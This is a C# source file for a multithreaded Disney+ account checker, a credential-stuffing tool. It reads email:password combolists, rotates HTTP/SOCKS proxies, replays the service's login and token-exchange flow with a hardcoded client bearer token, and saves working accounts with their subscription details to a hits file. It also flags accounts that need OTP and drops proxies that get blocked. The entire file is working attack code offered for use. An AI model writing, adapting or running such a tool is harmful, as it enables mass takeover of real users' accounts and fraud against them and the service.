using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using Newtonsoft.Json;
using Leaf.xNet;
using System.IO;
using Newtonsoft.Json.Linq;
using System.CodeDom;
using System.Windows.Forms;
using ThreadGun;

namespace ConsoleApp2
{
    internal class Program
    {
        public static int hits;
        public static int otp;
        public static int fails;
        public static int comboAmount;
        public static int threads;
        public static int cheked;
        public static int percentage;
        public static int proxyError;

        public static string proxyType;

        public static string currentTime = DateTime.Now.ToString("dd-MM-yyyy hh-mm-ss");


        public static List<string> proxyList = new List<string>();
        public static List<string> comboList = new List<string>();

        [STAThread]
        static void Main(string[] args)
        {
            Directory.CreateDirectory(Environment.CurrentDirectory + @"\\Results\\Disney+");

            Console.WriteLine("[!] Open a account list");
            Console.Write("> ");

            OpenFileDialog comboFile = new OpenFileDialog();
            comboFile.Title = "Open a combolist.";
            comboFile.Filter = "Text files (*.txt)|*.txt";
            if (comboFile.ShowDialog() == DialogResult.OK)
            {
                foreach (string line in File.ReadAllLines(comboFile.FileName))
                {
                    comboList.Add(line);
                }
                comboAmount = comboList.Count;
            }
            Console.Write($"[*] Found {comboList.Count()} accounts");

            Thread.Sleep(400);
            Console.Clear();

            Console.WriteLine("[!] How many threads?");
            Console.Write("> ");
            threads = Convert.ToInt32(Console.ReadLine());
            Thread.Sleep(300);
            Console.Clear();

            Console.WriteLine("[!] What type of proxy HTTP/SOCKS4/SOCKS5/NONE");
            Console.Write("> ");
            proxyType = Console.ReadLine();

            if (proxyType.ToUpper() != "NONE")
            {
                OpenFileDialog proxyFile = new OpenFileDialog();
                proxyFile.Title = "Open a proxy list.";
                proxyFile.Filter = "Text files (*.txt)|*.txt";
                if (proxyFile.ShowDialog() == DialogResult.OK)
                {
                    foreach (string line in File.ReadAllLines(proxyFile.FileName))
                    {
                        proxyList.Add(line);
                    }
                }
                Console.Write($"[*] Found {proxyList.Count()} proxies");
            }

            Thread.Sleep(300);
            Console.Clear();
            Console.WriteLine("[!] Starting!");
            Console.Clear();

            var tx = new ThreadGun.ThreadGun<string>(checker, comboList, threads, Thr_Completed, null).FillingMagazine().Start();
            Console.ReadLine();
        }

        public static void Thr_Completed(IEnumerable<string> inputs)
        {
            MessageBox.Show("Checking completed.", "Ok");
        }

        public static class json
        {
            internal class req1
            {
                public string deviceFamily = "browser";
                public string applicationRuntime = "chrome";
                public string deviceProfile = "windows";
                public string[] attributes;
            }

            internal class req2
            {
                public string email { get; set; }
            }

            internal class req3
            {
                public string email { get; set; }
                public string password { get; set; }
            }

            internal class req4
            {
                public string id_token { get; set; }
            }
        }

        public static void writeResults(string acc)
        {
            string file = Environment.CurrentDirectory + @"\\Results\\Disney+\\[Hits] " + currentTime + ".txt";
            File.AppendAllText(file, acc + Environment.NewLine);
        }

        public static string ToFormData(IDictionary<string, object> dict)
        {
            var list = new List<string>();

            foreach (var item in dict)
                list.Add(item.Key + "=" + item.Value);

            return string.Join("&", list);
        }

        public static string randomProxy()
        {
            Random random = new Random();
            string[] ararayProx = proxyList.ToArray();
            int indexx = random.Next(ararayProx.Length);
            return ararayProx[indexx];
        }


        private static void checker(string account)
        {
            Console.Title = $"Disney+ Checker: Hits: {hits} Fails: {fails} Otp: {otp} Proxy Error: {proxyError} Completed: {cheked / comboAmount} Percentage: {(cheked / comboAmount) * 100}";
            string email = string.Empty;
            string password = string.Empty;
            try
            {
                email = account.Split(':')[0];
                password = account.Split(':')[1];
            }
            catch
            {
                Interlocked.Increment(ref fails);
                Interlocked.Increment(ref cheked);
                Console.WriteLine($"[FAIL] {account}", Console.ForegroundColor = ConsoleColor.Red);
                return;
            }

            string assertion = string.Empty;
            string assertion2 = string.Empty;
            string access_token = string.Empty;
            string id_token = string.Empty;
            string tLevel_9 = string.Empty;

            HttpRequest httpRequest = new HttpRequest();

            try
            {
                if (proxyType == "HTTP")
                {
                    httpRequest.Proxy = HttpProxyClient.Parse(randomProxy());
                }
                else if (proxyType == "SOCKS4")
                {
                    httpRequest.Proxy = Socks4ProxyClient.Parse(randomProxy());
                }
                else if (proxyType == "SOCKS5")
                {
                    httpRequest.Proxy = Socks5ProxyClient.Parse(randomProxy());
                }
                else if (proxyType == "NONE")
                {
                    httpRequest.Proxy = null;
                }
            }
            catch (Exception ex)
            {
                Interlocked.Increment(ref proxyError);
            }

            try
            {
                var req1 = new json.req1();

                httpRequest.AddHeader("authorization", "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84");
                httpRequest.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Safari/537.36";
                httpRequest.AddHeader("content-type", "application/json");

                var p_1 = httpRequest.Post("https://global.edge.bamgrid.com/devices", JsonConvert.SerializeObject(req1, Formatting.None).Replace("null", "{}"), "application/json");
                dynamic ass = JsonConvert.DeserializeObject(p_1.ToString());
                assertion = ass["assertion"];
            }
            catch (Exception ex)
            {
                Interlocked.Increment(ref fails);
                Interlocked.Increment(ref cheked);
                Console.WriteLine($"[FAIL] {account}", Console.ForegroundColor = ConsoleColor.Red);
                return;
            }

            try
            {
                httpRequest.ClearAllHeaders();
                httpRequest.AddHeader("authorization", "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84");
                Dictionary<string, object> dict = new Dictionary<string, object>
                {
                    { "grant_type", "urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange" },
                    { "latitude", "0" },
                    { "longitude", "0" },
                    { "platform", "browser" },
                    { "subject_token", assertion },
                    { "subject_token_type", "urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Adevice" },
                };
                var req = httpRequest.Post("https://global.edge.bamgrid.com/token", ToFormData(dict), "application/x-www-form-urlencoded");

                dynamic ass = JsonConvert.DeserializeObject(req.ToString());
                access_token = ass["access_token"];
            }
            catch
            {
                Interlocked.Increment(ref fails);
                Interlocked.Increment(ref cheked);
                Console.WriteLine($"[FAIL] {account}", Console.ForegroundColor = ConsoleColor.Red);
                return;
            }

            try
            {
                httpRequest.ClearAllHeaders();
                httpRequest.AddHeader("authorization", $"Bearer {access_token}");
                var data_1 = new json.req2
                {
                    email = email,
                };
                var p_1 = httpRequest.Post("https://global.edge.bamgrid.com/idp/check", JsonConvert.SerializeObject(data_1), "application/json").ToString();
                if (p_1.Contains("\"operations\":[\"Login\",\"OTP\"]"))
                {
                    //success
                    try
                    {
                        httpRequest.ClearAllHeaders();
                        httpRequest.Authorization = $"Bearer {access_token}";
                        var data_2 = new json.req3
                        {
                            email = email,
                            password = password,
                        };

                        p_1 = httpRequest.Post("https://global.edge.bamgrid.com/idp/login", JsonConvert.SerializeObject(data_2), "application/json").ToString();
                        if (p_1.Contains("token_type") || p_1.Contains("id_token"))
                        {
                            dynamic ass = JsonConvert.DeserializeObject(p_1);
                            id_token = ass.id_token;

                            var data_3 = new json.req4
                            {
                                id_token = id_token,
                            };

                            p_1 = httpRequest.Post("https://global.edge.bamgrid.com/accounts/grant", JsonConvert.SerializeObject(data_3), "application/json").ToString();
                            ass = JsonConvert.DeserializeObject(p_1);

                            assertion2 = ass.assertion;

                            httpRequest.ClearAllHeaders();
                            httpRequest.AddHeader("authorization", "Bearer ZGlzbmV5JmJyb3dzZXImMS4wLjA.Cu56AgSfBTDag5NiRA81oLHkDZfu5L3CKadnefEAY84");
                            Dictionary<string, object> dict = new Dictionary<string, object>
                            {
                                { "grant_type", "urn%3Aietf%3Aparams%3Aoauth%3Agrant-type%3Atoken-exchange" },
                                { "latitude", "0" },
                                { "longitude", "0" },
                                { "platform", "browser" },
                                { "subject_token", assertion2 },
                                { "subject_token_type", "urn%3Abamtech%3Aparams%3Aoauth%3Atoken-type%3Aaccount" },
                            };

                            var req = httpRequest.Post("https://global.edge.bamgrid.com/token", ToFormData(dict), "application/x-www-form-urlencoded");
                            ass = JsonConvert.DeserializeObject(req.ToString());
                            tLevel_9 = ass.access_token;

                            if (tLevel_9 != String.Empty)
                            {
                                httpRequest.ClearAllHeaders();
                                httpRequest.AddHeader("authorization", tLevel_9);
                                var capture = httpRequest.Get("https://global.edge.bamgrid.com/subscriptions");

                                ass = JsonConvert.DeserializeObject(capture.ToString());

                                string subscriptions = ass[1].products[0].name;
                                string next_renewal_Date = ass[0].nextRenewalDate;
                                Console.WriteLine($"[HIT] {account} SUBSCRIPTIONS: {subscriptions} NEXT RENEWAL: {next_renewal_Date}", Console.ForegroundColor = ConsoleColor.Yellow);
                                writeResults($"[HIT] {account} SUBSCRIPTIONS: {subscriptions} NEXT RENEWAL: {next_renewal_Date}");
                                Interlocked.Increment(ref hits);
                                Interlocked.Increment(ref cheked);
                            }
                        }
                        if (p_1.Contains("Bad credentials") || p_1.Contains("idp.error.identity.bad-credentials"))
                        {
                            Interlocked.Increment(ref fails);
                            Interlocked.Increment(ref cheked);
                            Console.WriteLine($"[FAIL] {account}", Console.ForegroundColor = ConsoleColor.Red);
                            return;
                        }
                        if (p_1.Contains("\"code\":\"forbidden\""))
                        {
                            Interlocked.Increment(ref fails);
                            Interlocked.Increment(ref cheked);
                            Interlocked.Increment(ref proxyError);
                            lock (proxyList)
                            {
                                try
                                {
                                    proxyList.Remove(httpRequest.Proxy.ToString());
                                }
                                catch { }
                            }
                            Console.WriteLine($"[FAIL] {account}", Console.ForegroundColor = ConsoleColor.Red);
                            return;
                        }
                    }
                    catch (Exception ex)
                    {
                        Interlocked.Increment(ref fails);
                        Interlocked.Increment(ref cheked);
                        Console.WriteLine($"[FAIL] {account}", Console.ForegroundColor = ConsoleColor.Red);
                        return;
                    }
                }
                if (p_1.Contains("\"operations\":[\"Register\"]"))
                {
                    Interlocked.Increment(ref fails);
                    Interlocked.Increment(ref cheked);
                    Console.WriteLine($"[FAIL] {account}", Console.ForegroundColor = ConsoleColor.Red);
                    return;
                }
                if (p_1.Contains("\"operations\":[\"OTP\"]"))
                {
                    Console.WriteLine($"[OTP] {account}", Console.ForegroundColor = ConsoleColor.Blue);
                    //2Factor
                    Interlocked.Increment(ref otp);
                    Interlocked.Increment(ref cheked);
                }
            }
            catch (Exception ex) { return; }
        }
    }
}

